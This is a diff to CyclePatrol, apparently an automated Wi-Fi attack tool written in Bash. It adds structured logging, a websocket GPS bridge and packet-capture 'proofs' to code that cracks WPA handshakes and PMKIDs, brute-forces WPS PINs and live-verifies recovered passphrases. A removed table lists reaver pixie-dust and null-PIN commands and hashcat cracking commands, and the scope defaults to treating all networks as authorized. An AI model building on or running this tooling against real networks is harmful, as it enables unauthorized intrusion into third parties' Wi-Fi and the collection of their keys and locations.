@@ -9,9 +9,9 @@ shopt -s inherit_errexit lastpipe globstar nullglob
 set -o errtrace
 unset HISTFILE 2>/dev/null || true
 
-readonly VERSION="1.3"
+readonly VERSION="1.6"
 readonly SAR_VERSION="1"
-readonly REPORT_VERSION="4"
+readonly REPORT_VERSION="5"
 readonly TOOL_NAME="CyclePatrol"
 
 readonly C_RED=$'\033[0;31m'
@@ -92,6 +92,22 @@ readonly DEF_IFACE_RETRY_DELAY=2
 : "${DEFAULTKEY_MAX_SECS:=15}"
 : "${ENABLE_LIVE_VERIFY:=1}"
 : "${LIVE_VERIFY_SECS:=15}"
+: "${ENABLE_WATCH_TABLE:=1}"
+: "${WATCH_FILTER:=}"
+: "${WATCH_HIDE_DONE:=1}"
+: "${ENABLE_ADAPTIVE_RECON:=1}"
+: "${RECON_REFRESH_SECS:=900}"
+: "${RECON_MIN_GAP:=60}"
+: "${CHURN_PCT:=60}"
+: "${RSSI_DROP_DB:=15}"
+: "${GPS_MOVE_M:=150}"
+: "${EMPTY_CYCLE_LIMIT:=2}"
+: "${ENABLE_PSK_PROOF_PCAP:=1}"
+: "${ENABLE_CORPUS_POSTURE:=1}"
+: "${LOG_LEVEL:=INFO}"
+: "${ENABLE_JSONL_LOG:=1}"
+: "${LOG_ROTATE_BYTES:=5242880}"
+: "${LOG_ROTATE_KEEP:=3}"
 : "${RECON_SECS:=60}"
 : "${RECON_GPS:=0}"
 : "${RECON_BAND:=}"
@@ -111,6 +127,10 @@ SCOPE_ALL_AUTHORIZED=1
 : "${LOCATION_PROVIDER:=}"
 : "${LOCATION_NMEA_PORT:=2947}"
 : "${LOCATION_FEED_INTERVAL:=3}"
+: "${ENABLE_LOCATION_WS:=0}"
+: "${LOCATION_WS_PORT:=5555}"
+: "${LOCATION_WS_WAIT:=8}"
+: "${LOCATION_WS_MAX_AGE:=30}"
 : "${AUTO_INSTALL:=1}"
 : "${INSTALL_UPDATE_TIMEOUT:=120}"
 : "${INSTALL_TIMEOUT:=600}"
@@ -958,6 +978,7 @@ declare -ga BAND_6E_PSC=(5 21 37 53 69 85 101 117 133 149 165 181 197 213 229)
 declare -ga FOUND_TARGETS=()
 declare -ga SAR_RECORDS=()
 declare -ga LOCATION_OBSERVATIONS=()
+declare -g _WS_FEEDER_PID=""
 declare -gA SESSION_PROCESSED=()
 declare -gA FOUND_SEEN=()
 declare -g PROCESSED_FILE=""
@@ -973,6 +994,18 @@ declare -ga ATTEMPT_LOG=()
 declare -g TMP_DIR=""
 declare -g LOG_SESSION=""
 declare -g LOG_AUDIT=""
+declare -g LOG_EVENTS=""
+declare -g SCAN_ID=""
+declare -g RUN_START_TS=""
+declare -g LAST_RECON_TS=0
+declare -g EMPTY_CYCLES=0
+declare -g LOW_SIG_CYCLES=0
+declare -g PREV_RSSI_MED=""
+declare -g PREV_BSSID_FILE=""
+declare -g PREV_GPS=""
+declare -g RECON_REQUESTED=0
+declare -g RESCAN_FAST=0
+declare -g IFACE_REINIT=0
 declare -g RULE_TRACE_FILE=""
 declare -g WPS_CONF=""
 declare -g WPS_LOG=""
@@ -982,6 +1015,10 @@ declare -g LOCK_FILE=""
 declare -g KNOWN_FILE=""
 declare -g REPORT_STATE_RECON=""
 declare -g REPORT_STATE_VULN=""
+declare -g REPORT_STATE_POSTURE=""
+declare -g POSTURE_HTML=""
+declare -ga POSTURE_NEW=()
+declare -g CORPUS_HTML=""
 declare -g RECON_NEW_BSSIDS=""
 declare -g CLEAN_DONE=0
 declare -g WPS_PID=""
@@ -1015,6 +1052,9 @@ function audit_blank() {
 }
 
 function audit_header() {
+	# Verbose AP-DETAIL / ATTEMPT blocks are opt-in: events.jsonl is the record
+	# of truth, so cp_audit.log stays short (print_log lines only) unless asked.
+	[[ "${ENABLE_AUDIT_DETAIL:-0}" == "1" ]] || return 0
 	local title="$1"
 	shift
 	audit_blank
@@ -1025,6 +1065,45 @@ function audit_header() {
 	done
 	audit_write "------------------------------"
 	audit_blank
+}
+
+function _lvl_rank() {
+	case "${1:-}" in
+	DEBUG) printf 0 ;;
+	INFO | OK | SUCCESS | NET | HANDSHAKE) printf 1 ;;
+	WARN) printf 2 ;;
+	ERROR) printf 3 ;;
+	VULN | CRITICAL) printf 4 ;;
+	*) printf 1 ;;
+	esac
+}
+
+function log_event() {
+	[[ "${ENABLE_JSONL_LOG:-1}" == "1" ]] || return 0
+	[[ -n "${LOG_EVENTS:-}" ]] || return 0
+	local level="${1:-}" comp="${2:-}" msg="${3:-}" etype="${4:-}" dur="${5:-}" tech="${6:-}"
+	[[ -n "$etype" ]] || etype="${comp,,}"
+	local line
+	line=$(printf '{"time":"%s","scan_id":"%s","level":"%s","component":"%s","event_type":"%s","message":"%s","technical":"%s"' \
+		"$(ts_now)" "$(json_escape "${SCAN_ID:-}")" "$(json_escape "$level")" "$(json_escape "$comp")" "$(json_escape "$etype")" "$(json_escape "$msg")" "$(json_escape "$tech")")
+	[[ "$dur" =~ ^[0-9]+$ ]] && line+=$(printf ',"duration_ms":%s' "$dur")
+	line+='}'
+	printf '%s\n' "$line" >>"$LOG_EVENTS" 2>/dev/null || true
+	return 0
+}
+
+function _log_rotate() {
+	local f="${1:-}" max="${LOG_ROTATE_BYTES:-5242880}" keep="${LOG_ROTATE_KEEP:-3}" sz=0 i
+	[[ -n "$f" && -f "$f" ]] || return 0
+	sz=$(wc -c <"$f" 2>/dev/null) || sz=0
+	sz=${sz//[!0-9]/}
+	[[ -n "$sz" ]] || sz=0
+	((sz > max)) || return 0
+	for ((i = keep - 1; i >= 1; i--)); do
+		[[ -f "$f.$i" ]] && mv -f "$f.$i" "$f.$((i + 1))" 2>/dev/null || true
+	done
+	mv -f "$f" "$f.1" 2>/dev/null || true
+	return 0
 }
 
 function print_log() {
@@ -1039,13 +1118,18 @@ function print_log() {
 	if [[ -n "$LOG_AUDIT" && -w "$LOG_AUDIT" ]]; then
 		printf '%s\n' "$out_msg" >>"$LOG_AUDIT" 2>/dev/null || true
 	fi
+	log_event "$level" "$tag" "$msg" || true
+	if (($(_lvl_rank "$level") < $(_lvl_rank "${LOG_LEVEL:-INFO}"))); then
+		return 0
+	fi
 	case "$level" in
 	INFO) printf '[%s%s%s] %s\n' "$C_GREY" "$tag" "$C_RESET" "$msg" ;;
 	WARN) printf '[%s%s%s] %s\n' "$C_YELLOW" "$tag" "$C_RESET" "$msg" ;;
 	ERROR) printf '[%s%s%s] %s\n' "$C_RED" "$tag" "$C_RESET" "$msg" ;;
-	OK) printf '[%s%s%s] %s\n' "$C_GREEN" "$tag" "$C_RESET" "$msg" ;;
-	VULN) printf '[%s%s%s%s] %s\n' "$C_RED" "$C_BOLD" "$tag" "$C_RESET" "$msg" ;;
+	OK | SUCCESS) printf '[%s%s%s] %s\n' "$C_GREEN" "$tag" "$C_RESET" "$msg" ;;
+	VULN | CRITICAL) printf '[%s%s%s%s] %s\n' "$C_RED" "$C_BOLD" "$tag" "$C_RESET" "$msg" ;;
 	NET) printf '[%s%s%s] %s\n' "$C_CYAN" "$tag" "$C_RESET" "$msg" ;;
+	DEBUG) printf '[%s%s%s] %s\n' "$C_GREY" "$tag" "$C_RESET" "$msg" ;;
 	*) printf '[%s] %s\n' "$tag" "$msg" ;;
 	esac
 	return 0
@@ -1065,6 +1149,51 @@ function log_attempt() {
 		"time   : $(ts_now)" "bssid  : $b" "method : $method" \
 		"status : $status" "detail : $detail"
 	ATTEMPT_LOG+=("$b|$method|$status|$detail")
+	rule_result_emit_wire "$b" "$method" "$status" "$detail"
+}
+
+function print_hr() {
+	printf '%s%s%s\n' "$C_GREY" "------------------------------------------------------------" "$C_RESET"
+}
+
+function print_banner() {
+	print_hr
+	printf '%s  %s%s\n' "$C_BOLD" "${1:-}" "$C_RESET"
+	print_hr
+}
+
+function print_run_summary() {
+	local elapsed="n/a" now=""
+	if [[ "${RUN_START_TS:-}" =~ ^[0-9]+$ ]] && ((RUN_START_TS > 0)); then
+		now=$(date +%s 2>/dev/null) || now=""
+		if [[ "$now" =~ ^[0-9]+$ ]]; then elapsed="$((now - RUN_START_TS))s"; fi
+	fi
+	print_banner "SCAN SUMMARY"
+	printf '  %-13s %s\n' "Scan ID:" "${SCAN_ID:-n/a}"
+	printf '  %-13s %s\n' "Scans:" "${SCAN_NUM:-0}"
+	printf '  %-13s %s\n' "APs seen:" "${APS_SEEN:-0}"
+	printf '  %-13s %s\n' "Vectors run:" "${VECTORS_RUN:-0}"
+	printf '  %-13s %s\n' "Hits:" "${HITS:-0}"
+	printf '  %-13s %s\n' "Elapsed:" "$elapsed"
+	printf '  %-13s %s\n' "Log dir:" "${LOG_DIR:-n/a}"
+	printf '  %-13s %s\n' "Events:" "${LOG_EVENTS:-n/a}"
+	print_hr
+	log_event INFO SUMMARY "Scan complete" scan_summary "" "scans=${SCAN_NUM:-0} aps=${APS_SEEN:-0} vectors=${VECTORS_RUN:-0} hits=${HITS:-0} elapsed=${elapsed}"
+	return 0
+}
+
+function log_error_detail() {
+	local comp="${1:-ERROR}" what="${2:-}" why="${3:-}" check="${4:-}" tech="${5:-}"
+	local out_msg
+	out_msg="[$(ts_now)] [ERROR] [$comp] $what"
+	[[ -n "$LOG_SESSION" && -w "$LOG_SESSION" ]] && printf '%s\n' "$out_msg" >>"$LOG_SESSION" 2>/dev/null || true
+	[[ -n "$LOG_AUDIT" && -w "$LOG_AUDIT" ]] && printf '%s\n' "$out_msg" >>"$LOG_AUDIT" 2>/dev/null || true
+	log_event ERROR "$comp" "$what" error "" "why=${why} | check=${check} | tech=${tech}"
+	printf '[%s%s%s] %s\n' "$C_RED" "$comp" "$C_RESET" "$what"
+	[[ -n "$why" ]] && printf '  %swhy:%s   %s\n' "$C_GREY" "$C_RESET" "$why" || true
+	[[ -n "$check" ]] && printf '  %scheck:%s %s\n' "$C_GREY" "$C_RESET" "$check" || true
+	[[ -n "$tech" ]] && printf '  %stech:%s  %s\n' "$C_GREY" "$C_RESET" "$tech" || true
+	return 0
 }
 
 function run_cleanup() {
@@ -1079,6 +1208,10 @@ function run_cleanup() {
 	fi
 
 	print_log INFO CLEAN "Stop."
+
+	# tidy leftover flock lock files (run is ending; no concurrent holders)
+	local _lk
+	for _lk in "${LOG_DIR:-/tmp}"/*.lock; do rm -f "$_lk" 2>/dev/null || true; done
 
 	local pid
 	for pid in "$WPS_PID" "$CLI_PID" ${BG_PIDS[@]+"${BG_PIDS[@]}"}; do
@@ -1116,7 +1249,7 @@ function run_cleanup() {
 	fi
 
 	if [[ "$sig" == "EXIT" ]]; then
-		print_log INFO STATS "scans=$SCAN_NUM try=$VECTORS_RUN hit=$HITS ap=$APS_SEEN"
+		print_run_summary
 	fi
 }
 
@@ -1184,6 +1317,12 @@ function report_state_add() {
 			if [[ -f "$f" ]] && grep -qxF "$b" "$f" 2>/dev/null; then continue; fi
 			printf '%s\n' "$b" >>"$f" 2>/dev/null || true
 		done
+		# cap unbounded growth: keep only the most recent entries
+		local _max="${REPORT_STATE_MAX:-500}" _n
+		_n=$(($(grep -c . "$f" 2>/dev/null || true)))
+		if ((_n > _max)); then
+			tail -n "$_max" "$f" >"${f}.rot" 2>/dev/null && mv -f "${f}.rot" "$f" 2>/dev/null || rm -f "${f}.rot" 2>/dev/null || true
+		fi
 	) 201>"${f}.lock" 2>/dev/null || true
 	return 0
 }
@@ -1198,7 +1337,7 @@ function report_state_init() {
 			b="$(grep -m1 '^# bssid:' "$pf" 2>/dev/null | sed 's/^# bssid:[[:space:]]*//')" || b=""
 			[[ -n "$b" ]] && report_state_add "$REPORT_STATE_VULN" "$b"
 		done
-		print_log INFO REPORT "vuln history: $(grep -c . "$REPORT_STATE_VULN" 2>/dev/null || echo 0) net"
+		print_log INFO REPORT "vuln history: $(($(grep -c . "$REPORT_STATE_VULN" 2>/dev/null || true))) net"
 	fi
 	if [[ -n "${REPORT_STATE_RECON:-}" && ! -f "$REPORT_STATE_RECON" ]]; then
 		: >"$REPORT_STATE_RECON" 2>/dev/null || true
@@ -1208,7 +1347,7 @@ function report_state_init() {
 				[[ -n "$mac" ]] && report_state_add "$REPORT_STATE_RECON" "$mac"
 			done < <(grep -oE '[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}' "$rh" 2>/dev/null | sort -u || true)
 		done
-		print_log INFO REPORT "recon history: $(grep -c . "$REPORT_STATE_RECON" 2>/dev/null || echo 0) net"
+		print_log INFO REPORT "recon history: $(($(grep -c . "$REPORT_STATE_RECON" 2>/dev/null || true))) net"
 	fi
 	return 0
 }
@@ -1341,7 +1480,7 @@ function validate_positive_int() {
 
 function validate_env() {
 	if [[ ! "$IFACE" =~ ^[a-zA-Z0-9._-]{1,32}$ ]]; then
-		print_log ERROR FATAL "Bad iface: $IFACE"
+		log_error_detail FATAL "Bad adapter name." "The adapter name has bad characters." "Set IFACE to a real adapter, like wlan0." "IFACE=$IFACE did not match the allowed pattern."
 		exit 1
 	fi
 	if [[ "$LOG_DIR" == *".."* || "$LOG_DIR" == "-"* ]]; then
@@ -1978,7 +2117,13 @@ function do_backoff() {
 		} 200>"${esc_file}.lock"
 	fi
 
-	print_log WARN LOCKOUT "Locked $b"
+	# Warn once per BSSID: WPS lockout repeats dozens of times in the attack loop
+	# and flooded the log. Every lockout is still recorded via log_attempt.
+	declare -gA _LOCKOUT_SEEN 2>/dev/null || true
+	if [[ -z "${_LOCKOUT_SEEN[$b]:-}" ]]; then
+		print_log WARN LOCKOUT "Locked $b"
+		_LOCKOUT_SEEN["$b"]=1
+	fi
 	log_attempt "$b" "backoff" "$t" "sleep ${delay}s reason=$reason"
 
 	local lc_file="${TMP_DIR:-/tmp}/lock_counts.txt"
@@ -2049,8 +2194,17 @@ function iface_set_type() {
 		fi
 	done
 
+	# Last resort: an rfkill soft-block is the usual cause of a stuck adapter.
+	if command -v rfkill >/dev/null 2>&1; then
+		rfkill unblock all 2>/dev/null || true
+		ip link set "$IFACE" down 2>/dev/null || true
+		if iw dev "$IFACE" set type "$want" 2>/dev/null; then
+			ip link set "$IFACE" up 2>/dev/null || true
+			[[ "$(iface_get_type)" == "$want" ]] && return 0
+		fi
+	fi
 	ip link set "$IFACE" up 2>/dev/null || true
-	print_log ERROR IFACE "Iface failed"
+	print_log ERROR IFACE "Cannot set $IFACE to $want. Check: rfkill list (soft/hard block), adapter attached, driver supports $want mode."
 	return 1
 }
 
@@ -2183,27 +2337,6 @@ function json_escape() {
 	s=${s//$'\r'/\\r}
 	s=${s//$'\t'/\\t}
 	printf '%s' "$s"
-}
-
-function sar_json_get() {
-	local json="${1:-}" key="${2:-}" pattern value
-	[[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || return 1
-	pattern="\"${key}\"[[:space:]]*:[[:space:]]*\"(([^\"\\\\]|\\\\.)*)\""
-	[[ "$json" =~ $pattern ]] || return 1
-	value="${BASH_REMATCH[1]}"
-	value="${value//\\\"/\"}"
-	value="${value//\\\\/\\}"
-	printf '%s\n' "$value"
-}
-
-function rule_result_pack() {
-	local item
-	local -a fields=("$@")
-	for item in "${fields[@]}"; do
-		[[ "$item" != *$'\036'* ]] || return 1
-	done
-	local IFS=$'\036'
-	printf '%s' "${fields[*]}"
 }
 
 function rule_result_emit_wire() {
@@ -2354,6 +2487,29 @@ function location_fix() {
 		fi
 	fi
 
+	if ! location_valid "$lat" "$lon" && [[ "${ENABLE_LOCATION_WS:-0}" == "1" ]]; then
+		if command -v websocat >/dev/null 2>&1; then
+			src="ws"
+			print_log INFO GPS "provider: browser bridge (ws://*:${LOCATION_WS_PORT:-5555})"
+			location_ws_feeder "127.0.0.1" "${LOCATION_NMEA_PORT:-2947}" >/dev/null || true
+			local _wf="${LOG_DIR:-/tmp}/ws_fix" _wsdeadline=$((SECONDS + ${LOCATION_WS_WAIT:-8})) _wts _wnow
+			while ((SECONDS <= _wsdeadline)); do
+				if [[ -r "$_wf" ]]; then
+					IFS=' ' read -r lat lon _wts <"$_wf" 2>/dev/null || true
+					_wnow=$(date +%s)
+					if [[ "$_wts" =~ ^[0-9]+$ ]] && ((_wnow - _wts <= ${LOCATION_WS_MAX_AGE:-30})) && location_valid "$lat" "$lon"; then
+						break
+					fi
+					lat=""
+					lon=""
+				fi
+				sleep 1
+			done
+		else
+			print_log WARN GPS "websocat missing — browser bridge off. Install: cargo install websocat (or a release binary)."
+		fi
+	fi
+
 	if location_valid "$lat" "$lon"; then
 		print_log OK GPS "latitude received: $lat"
 		print_log OK GPS "longitude received: $lon"
@@ -2381,15 +2537,54 @@ function location_nmea_feeder() {
 	}
 	(
 		while :; do
-			local fr flat flon facc
+			local fr flat flon
 			fr="$(timeout --kill-after=3 -- "${LOCATION_TIMEOUT:-20}" termux-location -p "${LOCATION_PROVIDER:-gps}" 2>/dev/null || true)"
 			[[ -z "$fr" ]] && fr="$(timeout --kill-after=3 -- "${LOCATION_TIMEOUT:-20}" termux-location -p network 2>/dev/null || true)"
-			IFS=' ' read -r flat flon facc <<<"$(_loc_parse_termux "$fr")"
+			IFS=' ' read -r flat flon _ <<<"$(_loc_parse_termux "$fr")"
 			location_valid "$flat" "$flon" && _nmea_send "$host" "$port" "$flat" "$flon"
 			sleep "${LOCATION_FEED_INTERVAL:-3}"
 		done
 	) >/dev/null 2>&1 &
 	printf '%s' "$!"
+	return 0
+}
+
+# location.html websocket line "<iso-time> lat lon" (or "lat lon") -> "lat lon".
+function _ws_parse_line() {
+	local line="${1:-}" a b c
+	IFS=' ' read -r a b c <<<"$line"
+	if [[ -n "$c" ]]; then
+		printf '%s %s' "$b" "$c"
+	else
+		printf '%s %s' "$a" "$b"
+	fi
+}
+
+# Background bridge: browser location.html -> websocket -> gpsd + ws_fix file.
+# Reuses _nmea_send (no python). Idempotent; echoes the feeder pid.
+function location_ws_feeder() {
+	local host="${1:-127.0.0.1}" port="${2:-${LOCATION_NMEA_PORT:-2947}}"
+	local wsport="${LOCATION_WS_PORT:-5555}" fixfile="${LOG_DIR:-/tmp}/ws_fix"
+	command -v websocat >/dev/null 2>&1 || {
+		printf ''
+		return 1
+	}
+	if [[ -n "${_WS_FEEDER_PID:-}" ]] && kill -0 "$_WS_FEEDER_PID" 2>/dev/null; then
+		printf '%s' "$_WS_FEEDER_PID"
+		return 0
+	fi
+	(
+		websocat -b "ws-l:0.0.0.0:${wsport}" - 2>/dev/null | while IFS= read -r line; do
+			IFS=' ' read -r flat flon <<<"$(_ws_parse_line "$line")"
+			location_valid "$flat" "$flon" || continue
+			printf '%s %s %s\n' "$flat" "$flon" "$(date +%s)" >"${fixfile}.tmp" 2>/dev/null &&
+				mv -f "${fixfile}.tmp" "$fixfile" 2>/dev/null || true
+			_nmea_send "$host" "$port" "$flat" "$flon" || true
+		done
+	) >/dev/null 2>&1 &
+	_WS_FEEDER_PID=$!
+	BG_PIDS+=("$_WS_FEEDER_PID")
+	printf '%s' "$_WS_FEEDER_PID"
 	return 0
 }
 
@@ -2689,15 +2884,16 @@ function save_registrar() {
 	if [[ -z "${LOG_DIR:-}" ]]; then return 1; fi
 	mkdir -p "$LOG_DIR" 2>/dev/null || return 1
 	local out
-	out="${LOG_DIR}/device_${b//:/}_$(date +%s).json"
-	printf '{"bssid":"%s","essid":"%s","maker":"%s","model":"%s","device_name":"%s","serial":"%s","firmware":"%s","uuid":"%s","wps_version":"%s","chipset":"%s","time":"%s"}\n' \
+	# One append-only devices.jsonl (like sar.jsonl), not a file per AP. Dropped
+	# firmware/chipset: WPS never supplies them, so they were always "unknown".
+	out="${LOG_DIR}/devices.jsonl"
+	printf '{"bssid":"%s","essid":"%s","maker":"%s","model":"%s","device_name":"%s","serial":"%s","uuid":"%s","wps_version":"%s","time":"%s"}\n' \
 		"$(json_escape "$b")" "$(json_escape "$e")" "$(json_escape "${man:-unknown}")" \
 		"$(json_escape "${model:-unknown}")" "$(json_escape "${dev:-unknown}")" \
-		"$(json_escape "${ser:-unknown}")" "$(json_escape "${fw:-unknown}")" \
-		"$(json_escape "${uuid:-unknown}")" "$(json_escape "$ver")" \
-		"$(json_escape "$chip")" "$(json_escape "$(ts_now)")" >"$out" || return 1
+		"$(json_escape "${ser:-unknown}")" "$(json_escape "${uuid:-unknown}")" \
+		"$(json_escape "$ver")" "$(json_escape "$(ts_now)")" >>"$out" || return 1
 	chmod 600 "$out" 2>/dev/null || true
-	print_log INFO OSINT "Saved device: ${out##*/}"
+	print_log INFO OSINT "Device logged: $b"
 }
 
 function verify_psk_live() {
@@ -2742,8 +2938,48 @@ function verify_psk_live() {
 	return "$ok"
 }
 
+# A classic pcap global header is 24 bytes; anything <=24 has zero packets and
+# is worthless as proof (do not save it).
+function _pcap_has_packets() {
+	local f="${1:-}" sz
+	[[ -r "$f" ]] || return 1
+	sz=$(wc -c <"$f" 2>/dev/null) || sz=0
+	sz=${sz//[!0-9]/}
+	((${sz:-0} > 24))
+}
+
+function verify_psk_live_proofed() {
+	local b="$1" essid="$2" psk="$3"
+	local rc=2 pcap tdpid h
+
+	if [[ "${ENABLE_PSK_PROOF_PCAP:-1}" != "1" ]] || ! command -v tcpdump &>/dev/null; then
+		verify_psk_live "$b" "$essid" "$psk" && return 0 || return $?
+	fi
+
+	pcap="${HASH_DIR:-$LOG_DIR}/proof_${b//:/}_$(date +%s)_$$.eapol.pcap"
+	tcpdump -i "$IFACE" -w "$pcap" -U 'ether proto 0x888e' >/dev/null 2>&1 &
+	tdpid=$!
+
+	verify_psk_live "$b" "$essid" "$psk" && rc=0 || rc=$?
+
+	kill "$tdpid" 2>/dev/null || true
+	wait "$tdpid" 2>/dev/null || true
+
+	if ((rc == 0)) && _pcap_has_packets "$pcap"; then
+		h="n/a"
+		if command -v sha256sum &>/dev/null; then
+			h=$(sha256sum "$pcap" 2>/dev/null | awk '{print $1}') || h="n/a"
+		fi
+		log_attempt "$b" "psk_proof" "PROOF" "eapol_pcap=${pcap##*/} sha256=$h"
+	else
+		rm -f "$pcap" 2>/dev/null || true
+	fi
+
+	return "$rc"
+}
+
 function save_proof() {
-	local b="$1" chip="$2" pin="$3" psk="$4" meth="$5"
+	local b="$1" chip="$2" pin="$3" psk="$4" meth="$5" cap="${6:-}" wl="${7:-}"
 	if [[ ! -d "$LOG_DIR" ]]; then mkdir -p "$LOG_DIR" 2>/dev/null || return 1; fi
 	local name
 	name="proof_${b//:/}_$(date +%s)_$$.conf"
@@ -2759,14 +2995,30 @@ function save_proof() {
 		printf '# pin: %s\n' "${pin:-<empty>}"
 		printf '# psk: %s\n' "${psk:-unknown}"
 		printf '# psk_sha: %s\n' "${h:-none}"
+		if [[ -n "${pin:-}" && "$psk" == "$pin" ]]; then
+			printf '# psk_source: pin-as-candidate (equals recovered PIN; confirm WPA passphrase via association)\n'
+		else
+			printf '# psk_source: recovered\n'
+		fi
 	} >"$path"
 	chmod 600 "$path" 2>/dev/null || true
-	print_log OK PROOF "Saved: $name"
-	log_attempt "$b" "$meth" "SUCCESS" "pin=${pin:-<empty>} psk_sha=$h"
+	if [[ -n "$cap" && -r "$cap" ]]; then
+		local caphash
+		caphash=$(sha256sum -- "$cap" 2>/dev/null | awk '{print $1}') || caphash=""
+		{
+			printf '# capture_file: %s\n' "${cap##*/}"
+			printf '# capture_sha256: %s\n' "${caphash:-none}"
+		} >>"$path" 2>/dev/null || true
+	fi
+	if [[ -n "$wl" ]]; then
+		printf '# crack_input: %s\n' "${wl##*/}" >>"$path" 2>/dev/null || true
+	fi
+	print_log OK PROOF "proof saved"
+	log_attempt "$b" "$meth" "SUCCESS" "pin=${pin:-<empty>} psk_sha=$h proof=$name"
 	mark_known "$b" "SUCCESS:${meth}"
 	CREDS_FOUND+=("$b|${CUR_ESSID:-}|$meth|${pin:-}|${psk:-}")
 	if [[ "${REVEAL_CREDS:-0}" == "1" ]]; then
-		print_log VULN CREDS "$b ${CUR_ESSID:-hidden} PIN=${pin:-<empty>} PSK=${psk:-<unknown>} via $meth"
+		print_log VULN CREDS "key found"
 	fi
 
 	if [[ "${ENABLE_LIVE_VERIFY:-1}" == "1" ]]; then
@@ -2775,11 +3027,11 @@ function save_proof() {
 			log_attempt "$b" "$meth" "LIVE_VERIFY" "yes (online association during attack)"
 		else
 			local _lv_rc=2
-			verify_psk_live "$b" "${CUR_ESSID:-}" "$psk" && _lv_rc=0 || _lv_rc=$?
+			verify_psk_live_proofed "$b" "${CUR_ESSID:-}" "$psk" && _lv_rc=0 || _lv_rc=$?
 			case "$_lv_rc" in
 			0)
 				printf '# live_verified: yes (one-shot wpa_supplicant association)\n' >>"$path" 2>/dev/null || true
-				print_log VULN LIVEVERIFY "$b live verified"
+				print_log VULN LIVEVERIFY "live verified"
 				log_attempt "$b" "$meth" "LIVE_VERIFY" "yes (live association succeeded)"
 				;;
 			1)
@@ -2789,6 +3041,20 @@ function save_proof() {
 			esac
 		fi
 	fi
+	_proofs_manifest_add "$b" "${CUR_ESSID:-}" "$meth" "$path"
+}
+
+function _proofs_manifest_add() {
+	local b="$1" e="$2" meth="$3" path="$4"
+	[[ -s "$path" ]] || return 0
+	local dir="${LOG_DIR:-.}" sha psha lv
+	sha=$(sha256sum -- "$path" 2>/dev/null | awk '{print $1}') || sha=""
+	psha=$(grep -m1 '^# psk_sha:' "$path" 2>/dev/null | sed 's/^# psk_sha:[[:space:]]*//') || psha=""
+	lv=$(grep -m1 '^# live_verified:' "$path" 2>/dev/null | sed 's/^# live_verified:[[:space:]]*//') || lv=""
+	e="${e//\"/}"
+	printf '{"time":"%s","bssid":"%s","essid":"%s","method":"%s","file":"%s","sha256":"%s","psk_sha":"%s","live_verified":"%s"}\n' \
+		"$(ts_now)" "$b" "$e" "$meth" "${path##*/}" "${sha:-none}" "${psha:-none}" "${lv:-no}" \
+		>>"${dir}/proofs.jsonl" 2>/dev/null || true
 }
 
 function extract_wps_hex() {
@@ -3458,8 +3724,8 @@ function offline_crack() {
 			psk="$(_run_cracker "$b" "$cap" "$dkl")" || psk=""
 			if [[ "$dkl" == *.f ]]; then rm -f "$dkl" 2>/dev/null || true; fi
 			if [[ -n "$psk" ]]; then
-				print_log VULN HACKED "$b key found"
-				save_proof "$b" "$chip" "" "$psk" "$dk_meth"
+				print_log VULN HACKED "key found"
+				save_proof "$b" "$chip" "" "$psk" "$dk_meth" "$cap"
 				return 0
 			fi
 			log_attempt "$b" "$dk_meth" "FAIL" "no default-key candidate matched"
@@ -3472,8 +3738,8 @@ function offline_crack() {
 	log_attempt "$b" "$meth" "START" "offline crack budget=${OFFLINE_CRACK_MAX_SECS:-30}s wl=${wl##*/}"
 	psk="$(_run_cracker "$b" "$cap" "$wl")" || psk=""
 	if [[ -n "$psk" ]]; then
-		print_log VULN HACKED "$b key found"
-		save_proof "$b" "$chip" "" "$psk" "$meth"
+		print_log VULN HACKED "key found"
+		save_proof "$b" "$chip" "" "$psk" "$meth" "$cap" "$wl"
 		return 0
 	fi
 	log_attempt "$b" "$meth" "FAIL" "offline crack: no key within ${OFFLINE_CRACK_MAX_SECS:-30}s / wordlist"
@@ -4168,7 +4434,7 @@ EOF
 		pid=""
 
 		if ((hit == 1)); then
-			print_log VULN HACKED "$b key found"
+			print_log VULN HACKED "key found"
 			save_proof "$b" "${CUR_CHIP:-unknown}" "" "$pw" "wpa_brute"
 			HITS=$((${HITS:-0} + 1))
 			ok=1
@@ -4336,24 +4602,6 @@ function _evtype_for() {
 	esac
 }
 
-function _finding_meta() {
-	case "${1:-}" in
-	pixie) printf 'CRITICAL|wps pin popped with pixie dust (offline)|wps external registrar pin design flaw (US CERT VU#723755); pixie dust offline recovery (D. Bongard 2014), weak nonce on many Ralink Realtek Broadcom MediaTek chips|pixiewps on captured M1 M2 M3, or: reaver -i <mon> -b <BSSID> -c <CH> -K 1' ;;
-	vendor) printf 'CRITICAL|wps pin popped, vendor default pin|factory default or vendor algo wps pin (from oui or serial, or a public default)|reaver -i <mon> -b <BSSID> -c <CH> -p <PIN>' ;;
-	user_pin) printf 'HIGH|wps pin confirmed good|the ap took the pin we gave it|reaver -i <mon> -b <BSSID> -c <CH> -p <PIN>' ;;
-	null) printf 'CRITICAL|wps takes a null pin|the ap takes the all zero wps pin with no real registrar|reaver -i <mon> -b <BSSID> -c <CH> -p 00000000' ;;
-	empty) printf 'CRITICAL|wps takes an empty pin|the ap takes an empty wps pin value|reaver driving an empty pin exchange' ;;
-	wpa_brute) printf 'CRITICAL|wpa2 key popped, offline handshake or pmkid crack|wpa2 4 way handshake or pmkid offline dictionary crack (hashcat mode 22000)|hashcat -m 22000 <capture.22000> <wordlist>' ;;
-	pmkid) printf 'CRITICAL|wpa2 key popped, pmkid offline crack|pmkid captured clientless then cracked offline (hashcat mode 22000)|hashcat -m 22000 <pmkid.22000> <wordlist>' ;;
-	handshake) printf 'CRITICAL|wpa2 key popped, 4 way handshake offline crack|4 way handshake captured then cracked offline (hashcat mode 22000)|hashcat -m 22000 <capture.22000> <wordlist>' ;;
-	pmkid-tm) printf 'CRITICAL|wpa2 key popped on a wpa3 transition ap, pmkid offline crack|wpa3 transition ap still answers wpa2 psk; pmkid captured then cracked offline (Dragonblood transition downgrade)|hashcat -m 22000 <pmkid.22000> <wordlist>' ;;
-	handshake-tm) printf 'CRITICAL|wpa2 key popped on a wpa3 transition ap, handshake offline crack|wpa3 transition ap still answers wpa2 psk; 4 way handshake captured then cracked offline (Dragonblood transition downgrade)|hashcat -m 22000 <capture.22000> <wordlist>' ;;
-	defaultkey) printf 'CRITICAL|wpa2 factory default key recovered from bssid/essid keyspace|vendor default wpa2 psk derived from mac/essid, small deterministic keyspace, verified against the captured pmkid/handshake (USENIX WOOT 2015)|candidate list from routerkeygen/hcxpsktool; hashcat -m 22000 <capture.22000> <candidates>' ;;
